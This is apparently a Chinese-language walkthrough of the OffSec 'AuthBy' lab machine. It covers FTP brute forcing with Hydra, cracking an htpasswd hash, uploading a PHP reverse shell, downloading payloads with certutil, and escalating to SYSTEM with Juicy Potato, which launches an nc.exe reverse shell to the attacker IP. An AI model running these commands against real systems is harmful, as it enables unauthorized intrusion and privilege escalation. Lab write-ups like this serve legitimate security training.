# Intermediate
# AuthBy
![image](https://hackmd.io/_uploads/Bys4Z76nye.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.124.46          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 11:51 EDT
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 11:54 (0:00:06 remaining)
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 11:54 (0:00:00 remaining)
Nmap scan report for 192.168.124.46
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Mar 22 22:54 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-03-22T15:54:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-02T13:17:54
|_Not valid after:  2025-02-01T13:17:54
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-03-22T15:54:30+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
> ftp (Anonymous), FTPServer, http, RDP

瀏覽 192.168.124.46:242\
![image](https://hackmd.io/_uploads/Skp30U2nkx.png)
#### 1.2 ftp
```
┌──(chw㉿CHW)-[~]
└─$ ftp Anonymous@192.168.124.46                                                                               
Connected to 192.168.124.46
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2049|)
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Mar 22 22:54 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
226 Closing data connection.
```
wget 到本機
```
┌──(chw㉿CHW)-[~]
└─$ wget -r ftp://Anonymous@192.168.124.46
...
No such file ‘acc[anonymous].uac’.

--2025-03-22 12:13:55--  ftp://Anonymous@192.168.124.46/accounts/acc%5Badmin%5D.uac
           => ‘192.168.124.46/accounts/acc[admin].uac’
==> CWD not required.
==> PASV ... done.    ==> RETR acc[admin].uac ... 
No such file ‘acc[admin].uac’.
```
> 失敗

>[!Important]
> FTP Server（特別是 Windows FTP server）不允許 PASV 模式搭配 filename 中包含特殊字元（如中括號 []）或大小寫敏感\
> >使用 `lftp`

```
┌──(chw㉿CHW)-[~]
└─$ lftp -u anonymous, ftp://192.168.124.46 -e "mirror --verbose --parallel=5 --continue --target-directory ./ftp; quit" 
```
> 也失敗，檢查後是沒有權限

### 2. Hydra
使用 Hydra 爆破 ftp 
```
┌──(chw㉿CHW)-[~]
└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.124.46 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-23 02:10:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.124.46:21/
[21][ftp] host: 192.168.124.46   login: admin   password: admin
[21][ftp] host: 192.168.124.46   login: anonymous   password: anonymous
[21][ftp] host: 192.168.124.46   login: Admin   password: admin
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-23 02:11:10
```
Admin 連線 ftp
```
┌──(chw㉿CHW)-[~]
└─$ ftp admin@192.168.124.46                                                                                          
Connected to 192.168.124.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||2054|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
d--x--x--x   1 root     root          512 Mar 23 06:14 ..
d--x--x--x   1 root     root          512 Mar 23 06:14 .
```
wget 到本機
```
┌──(chw㉿CHW)-[~]
└─$ wget -r ftp://admin:admin@192.168.124.46

┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ cat index.php
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>                                                                

┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

### 3. Hashcat
Hashcat 爆出 offsec 密碼
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ hashid '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' -m                                                              
Analyzing '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0'
[+] MD5(APR) [Hashcat Mode: 1600]
[+] Apache MD5 [Hashcat Mode: 1600]

┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ cat AuthBy.hash 
$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ hashcat -m 1600 AuthBy.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.6) starting
...
$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite
...
```
> 嘗試登入 Http 或 rdp
### 4. Offsec 登入
#### 4.1 登入 RDP
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ rdesktop 192.168.124.46
```
> RDP 失敗
![image](https://hackmd.io/_uploads/HyoaqQThkl.png)

#### 4.2 登入 HTTP
![image](https://hackmd.io/_uploads/HJMTKXT2yx.png)
> 成功，且顯示 index.php

在 ftp 上傳 shell，驗證能否成功顯示

### 5. Reverse Shell
>[!Tip]
>🎯 兩種方法
>1. PHP ( wget kali 的 `rev.exe` 並執行)
>2. 在 php 直接建 reverse shell

使用現成 [ivan-sincek](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php) 寫好的 reverse shell
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ cat chw_revall.php 
...
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.165', 8888);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```
上傳 FTP Server
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ ftp admin@192.168.124.46       
Connected to 192.168.124.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put chw_revall.php 
local: chw_revall.php  remote: chw_revall.php 
229 Entering Extended Passive Mode (|||2067|)
150 File status okay; about to open data connection.
100% |**********************************************************************************************|  9408       48.49 MiB/s    00:00 ETA
226 Closing data connection.
9408 bytes sent in 00:00 (30.04 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||2068|)
150 Opening connection for /bin/ls.
total 34
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root         9408 Mar 23 14:22 chw_revall.php 
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
```
Kali 開啟監聽 port
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
```

瀏覽上傳檔案: http://192.168.124.46:242/chw_revall.php \
`curl -u 'offsec:elite' -X GET http://192.168.124.46:242/chw_revall.php`
### 6. 取得 Shell
```
┌──(chw㉿CHW)-[~/192.168.124.46]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.124.46] 49159
SOCKET: Shell has connected! PID: 2624
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>whoami
livda\apache

```
### ✅ Get User Flag
> 在 `C:\Users\apache\Desktop`找到 User flag
## Privileges Escalation
```
C:\wamp\bin\apache\Apache2.2.21>whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory group, Enabled by default, Enabled group

C:\wamp\bin\apache\Apache2.2.21>systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          3/23/2025, 12:48:23 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,675 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,555 MB
Page File: In Use:         430 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A

C:\wamp\bin\apache\Apache2.2.21>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\wamp\bin\apache\Apache2.2.21>whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory group, Enabled by default, Enabled group
```
> 1.  shell 是以 `NT AUTHORITY\SERVICE` 執行 (S-1-5-6)
> ![image](https://hackmd.io/_uploads/ry-wGrT3yg.png)
> 2. SeImpersonatePrivilege 可以嘗試利用 PrintSpoofer

### 7. SigmaPotato
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe

┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
使用 powershell
```
C:\Windows\System32>dir /s /b C:\powershell.exe

:\Windows\winsxs\x86_microsoft-windows-powershell-exe_31bf3856ad364e35_6.0.6001.18000_none_6915feb40232a384\powershell.exe

C:\Windows\System32>
C:\Windows\System32>\Windows\winsxs\x86_microsoft-windows-powershell-exe_31bf3856ad364e35_6.0.6001.18000_none_6915feb40232a384\powershell.exe

C:\Windows\System32>powershell
'powershell' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\System32>copy "C:\Windows\winsxs\x86_microsoft-windows-powershell-exe_31bf3856ad364e35_6.0.6001.18000_none_6915feb40232a384\powershell.exe" C:\Windows\System32\
Access is denied.
        0 file(s) copied.
```
> 不能使用 Powershell

```
C:\Windows\System32>wget
'wget' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\System32>iwr
'iwr' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\System32>curl
'curl' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\System32>certutil
CertUtil: -dump command completed successfully.
```
> 只有 CertUtil 可用

下載 SigmaPotato.exe
```
C:\Windows\System32>certutil -urlcache -split -f http://192.168.45.165/SigmaPotato.exe SigmaPotato.exe
****  Online  ****
CertUtil: -URLCache command FAILED: 0x80070005 (WIN32: 5)
CertUtil: Access is denied.
```
> 路徑不可寫

改至 `C:\Users\Public` 或 `C:\Windows\Temp`
```
C:\Users\Public>certutil -urlcache -split -f http://192.168.45.165/SigmaPotato.exe SigmaPotato.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\Public

03/23/2025  01:45 AM    <DIR>          .
03/23/2025  01:45 AM    <DIR>          ..
03/23/2025  01:44 AM                 0 certutil
01/19/2008  01:45 AM    <DIR>          Documents
01/19/2008  01:45 AM    <DIR>          Downloads
01/19/2008  01:45 AM    <DIR>          Music
01/19/2008  01:45 AM    <DIR>          Pictures
03/23/2025  01:45 AM            63,488 SigmaPotato.exe
01/19/2008  01:45 AM    <DIR>          Videos
               2 File(s)         63,488 bytes
               7 Dir(s)   6,031,769,600 bytes free

C:\Users\Public>.\SigmaPotato "net user chw chw /add"

C:\Users\Public>.\SigmaPotato "net localgroup Administrators chw /add"

C:\Users\Public>net user chw
The user name could not be found.

More help is available by typing NET HELPMSG 2221.
```
> 上網 research 後， `SigmaPotato` 不支援 Windows 7/2008 R2 (x86/x64)，需要使用 Juicy-Potato-x86

### 8. Juicy-Potato-x86
#### 8.1 下載 Juicy-Potato-x86.exe
```
C:\Users\Public>certutil -urlcache -split -f http://192.168.45.165/Juicy.Potato.x86.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\Public

03/23/2025  02:27 AM    <DIR>          .
03/23/2025  02:27 AM    <DIR>          ..
03/23/2025  01:44 AM                 0 certutil
01/19/2008  01:45 AM    <DIR>          Documents
01/19/2008  01:45 AM    <DIR>          Downloads
03/23/2025  02:27 AM           263,680 Juicy.Potato.x86.exe
01/19/2008  01:45 AM    <DIR>          Music
01/19/2008  01:45 AM    <DIR>          Pictures
03/23/2025  01:45 AM            63,488 SigmaPotato.exe
01/19/2008  01:45 AM    <DIR>          Videos
               3 File(s)        327,168 bytes
               7 Dir(s)   6,030,557,184 bytes free
```
另外使用 Juicy-Potato-x86 打 reverse shell 會使用 nc.exe
```
C:\Users\Public>certutil -urlcache -split -f http://192.168.45.165/nc_x86.exe nc.exe
```
#### 8.2 查詢 CLID 
Juicy-Potato-x86 需要一組可用 CLSID\
[CLID ](https://github.com/ohpe/juicy-potato/tree/master/CLSID/?source=post_page-----96e74b36375a---------------------------------------):`{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`\
![image](https://hackmd.io/_uploads/H11LS86nye.png)

### 8.3 執行 Juicy-Potato-x86
```
C:\Users\Public>.\Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/cc:\users\Public\nc.exe -e cmd.exe 192.168.45.165 6666" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```
>`-l 1337`: 開一個偽裝的 COM listening port (不要衝突 Service TCP port 即可)\
>`-p c:\windows\system32\cmd.exe`: 指定執行系統內建的 cmd.exe\
>`-a "/cc:\users\Public\nc.exe -e cmd.exe 192.168.45.165 6666"`: nc reverse shell
>`-t *`: COM type `*` 表示使用預設 DCOM 授權方式（LocalService、NetworkService 等）\
>`-c CLID`: 指定要利用的 COM CLSID

(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.124.46] 49360
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```
>[!Important]
>後來參考其他 Writeup：
>windows server 2008 standard 6001 privilege escalation\
>有 exploit 可以直接使用\
>`searchsploit ms11-046`

### ✅ Get Root FLAG
> 在 `C:\Users\Administrator\Desktop` 找到 Root flag
